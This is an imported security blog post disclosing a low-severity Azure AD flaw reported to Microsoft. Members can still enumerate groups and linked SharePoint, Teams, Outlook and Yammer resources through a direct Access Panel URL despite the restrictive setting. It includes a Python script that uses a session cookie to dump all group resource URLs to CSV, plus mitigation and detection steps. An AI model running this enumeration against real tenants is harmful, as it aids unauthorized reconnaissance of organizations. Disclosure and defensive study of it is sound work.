---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-02_azure-security-internal-recon-leveraging-lack-of-access-control.md
original_filename: 2023-02-02_azure-security-internal-recon-leveraging-lack-of-access-control.md
title: Azure security — Internal recon leveraging lack of access control
category: documents
detected_topics:
- access-control
- automation-abuse
- sso
- idor
- command-injection
- rate-limit
tags:
- imported
- documents
- access-control
- automation-abuse
- sso
- idor
- command-injection
- rate-limit
language: en
raw_sha256: ff60eddeedfabe136119254a7e76bc92365b06013601030cff35c1e603afef78
text_sha256: 7ebd7bcf1211202ca4c03d396062c8a54456f164b03cd89ad6a3f11ae8469b4f
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# Azure security — Internal recon leveraging lack of access control

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-02_azure-security-internal-recon-leveraging-lack-of-access-control.md
- Source Type: markdown
- Detected Topics: access-control, automation-abuse, sso, idor, command-injection, rate-limit
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `ff60eddeedfabe136119254a7e76bc92365b06013601030cff35c1e603afef78`
- Text SHA256: `7ebd7bcf1211202ca4c03d396062c8a54456f164b03cd89ad6a3f11ae8469b4f`


## Content

---
title: "Azure security — Internal recon leveraging lack of access control"
page_title: "CyberIntruder | Blog"
url: "https://molx32.github.io/blog/2023/Azure-access-panel-lack-of-access-control/"
final_url: "https://cyber-intruder.com/blog/2023/Azure-access-panel-lack-of-access-control/"
authors: ["Molx32"]
programs: ["Microsoft (Azure)"]
bugs: ["Azure AD", "Cloud", "Security misconfiguration", "Privilege escalation"]
publication_date: "2023-02-02"
added_date: "2023-04-27"
source: "pentester.land/writeups.json"
original_index: 1583
---

I recently reported to Microsoft MSRC an issue that is, from my point of view, a low-severity vulnerability that allows ‘Members’ of Azure AD tenant to enumerate group-related resources, despite hardening Azure AD settings. This could be leveraged by an attacker during internal recon phase.

### Context

#### Azure AD setting

When configuring Azure AD, there are common features and settings that are usually hardened to restrict users permissions. One of these settings is **Restrict user ability to access groups features in the Access Panel**. This is used to prevent the access to the [Access Panel groups feature](https://account.activedirectory.windowsazure.com/r#/groups), and thus prevent them from enumerating groups, send request to join groups, and access groups-related information. As MSRC answered when I reported the issue : _The tenant wide setting, “Restrict user ability to access groups features in the Access Panel” controls users access to the My Groups UI._. This is what we can leverage to improve Azure recon.

#### About groups in Azure AD

But first of all, a small talk about groups in Azure AD. There are multiple, and here are their description (I have shamelessly copied from [MS docs](https://learn.microsoft.com/en-us/microsoft-365/admin/create-groups/compare-groups?view=o365-worldwide)) :

  * **Security groups** \- _Used for granting access to resources such as SharePoint sites._
  * **M365 Groups** \- _Used for collaboration between users, both inside and outside your company. They include collaboration services such as SharePoint and Planner._
  * **Mail-enabled security groups** \- _Used for granting access to resources such as SharePoint, and emailing notifications to those users._
  * **Shared mailboxes** \- _Used when multiple people need access to the same mailbox, such as a company information or support email address._
  * **Dynamic distribution groups** \- _Created to expedite the mass sending of email messages and other information within an organization._
  * **Distribution groups** \- _Used for sending email notifications to a group of people_ Note that when a Microsoft 365 Group is created, associated resources usually come with it.

There are multiple common methods to create a group, and depending on how you do, visibility could be set on ‘Public’ :

  * Using the [Azure portal](https://portal.azure.com), you can create both security and M365 groups. Note that using this will cause M365 groups to be private, which is a good thing.
  * Using the Azure CLI command **az group create** only allows you to create private security groups.
  * Using the **New-MsolGroup** only allows you to create private security groups.
  * Using **New-AzADGroup** command allows to create all kinds of groups with the specified visibility for M365 groups

The last common method is using the [M365 Admin portal](https://admin.microsoft.com). As shown on the picture below, the default visibility is Public. The truth is administrator should properly configure this, but they sometimes don’t, especially when groups were created a few years ago, when security was not one of the biggest concerns for companies.

![](/assets/img/MS_vuln_05.png)

### Why is it interesting for an attacker?

As shown on the scheme, based on the Azure AD configuration, an attacker could enumerate interesting resources (SharePoint, Yammer, Teams, Outlook group email) and add themselves to public groups without requiring access in order to receive emails sent to the associated email address.

![](/assets/img/MS_vuln_04.png)

#### Behavior when configured on No (permissive)

When the setting is configured to be permissive, any non-privileged user can access the following data :

  * List of groups
  * List of resources associated to groups : Outlook, SharePoint, Yammer, Teams
  * List of people member of groups

Administrators may want to disable this feature to prevent users seing this data. _Note_ : Guest users can not see this by default.

#### Behavior when configured on Yes (restrictive)

When the setting is configured to be restrictive, there is an error page that prevents group and group resource enumeration. The first picture shows Azure AD with the setting set on Yes.

![](/assets/img/MS_vuln_01.png)

This second picture shows the user who can no longer access to the group feature in the Access Panel.

![](/assets/img/MS_vuln_02.png)

* * *

### The issue

#### POC

To reproduce the issue :

  1. As an administrator, set the **Restrict user ability to access groups features in the Access Panel** setting on **Yes**
  2. Authenticate as a non-privileged user
  3. Get a group GUID
  4. Access the following URL : 
  
  https://account.activedirectory.windowsazure.com/r#/manageMembership?objectType=Group&objectId=<GUID>
  

#### Automation

Here is a probably not optimized piece of code that takes a cookie as input, and generates a CSV with all group resources URLs.
  
  
  import subprocess
  import sys
  import csv
  import requests
  import json
  
  # Used to invoke Azure CLI commands
  def run(cmd):
  completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
  return completed
  
  # Used to export findings into CSV
  def write_header():
  s = 'Id,DisplayName,JoinPolicy,SharePointUrl,TeamsUrl,OutlookUrl,YammerUrl\n'
  with open('results.csv', 'a') as result_file:
  result_file.write(s)
  # Used to write line into CSV
  def write_line(data):
  json_data = json.loads(data)
  print(json_data)
  s = str(json_data['Id']) + ',' + str(json_data['DisplayName']) + ',' + str(json_data['JoinPolicy']) + ',' + str(json_data['SharePointUrl']) + ',' + str(json_data['TeamsUrl']) + ',' + str(json_data['OutlookUrl']) + ',' + str(json_data['YammerUrl']) + '\n'
  
  with open('results.csv', 'a') as result_file:
  result_file.write(s)
  
  # Used to fecth and parse data
  def retrieve_data(cookie, guid):
  url_base = "https://account.activedirectory.windowsazure.com"
  url_path = "/group/DetailsData/"
  
  # Final values
  url = url_base + url_path + guid
  headers = {
  'Cache-Control':'max-age=0',
  'Sec-Ch-Ua':'"Opera";v="93", "Not/A)Brand";v="8", "Chromium";v="107"',
  'Sec-Ch-Ua-Mobile':'?0',
  'Sec-Ch-Ua-Platform':'"Windows"',
  'Upgrade-Insecure-Requests':'1',
  'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
  'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'Sec-Fetch-Site':'none',
  'Sec-Fetch-Mode':'navigate',
  'Sec-Fetch-User':'?1',
  'Sec-Fetch-Dest':'document',
  'Accept-Encoding':'gzip, deflate',
  'Accept-Language':'en-US,en;q=0.9',
  'Connection':'close'
  }
  
  cookies = {'.AspNet.Cookies': cookie}
  
  r = requests.get(url, headers=headers, cookies=cookies)
  data = r.content.decode().splitlines()[1]
  return data
  
  
  
  
  if __name__ == '__main__':
  
  # Handle cookie argument.
  # The '.AspNet.Cookies' must not be passed, only the hash value
  cookie = sys.argv[1]
  if not cookie:
  print('Error with provided arguments\nExample: python3 enumerate.py 1EMV2FJC_E_cwrBkZIu_ufEP[...]]7v3Lw')
  sys.exit(1)
  
  
  # Shoud be done with az ad group list
  export_groups_cmd = "az login; az ad group list > groups.tmp"
  
  # CONNECT MSOL
  r = run(cmd=export_groups_cmd)
  if r.returncode != 0:
  print("An error occured: %s", r.stderr)
  else:
  print(export_groups_cmd + " command executed successfully!")
  
  # Parse JSON
  # Read file
  data = None
  with open("groups.tmp", encoding='utf-16') as data_file:
  write_header()
  groups = json.load(data_file)
  for group in groups:
  data = retrieve_data(cookie, group['id'])
  write_line(data)
  
  print("*** FILE results.csv CREATED ***")

See the video to look at how to use it easily.

* * *

### Remediate and detect

#### Mitigation

To be clear, there’s no reliable mitigation. The only thing I identified is the configuration of the **UsersPermissionToReadOtherUsersEnabled** feature to **false** , using the command below. According to Microsoft documentation, this settings _“Indicates whether to allow users to view the profile info of other users in their company. This setting is applied company-wide. Set to $False to disable users’ ability to use the Azure AD module for Windows PowerShell to access user information for their organization.”_.
  
  
  Set-MsolCompanySettings -UsersPermissionToReadOtherUsersEnabled $false

Also, you may have noticed that non privileged users are allowed to use tools such as Azure CLI. This can’t be mitigated for Azure CLI, however you can disable the use of Msol module using this command.
  
  
  Disable-AADIntTenantMsolAccess

#### Detection

Altough this can’t be mitigated, you can still detect it though Azure AD non-interactive signin logs to the **Microsoft App Access Panel** application. Just send this to Microsoft Sentinel, and create a detection rule to raise an alert when multiple attempts are performed from the same user in a short timeframe.

![](/assets/img/MS_vuln_06.png)
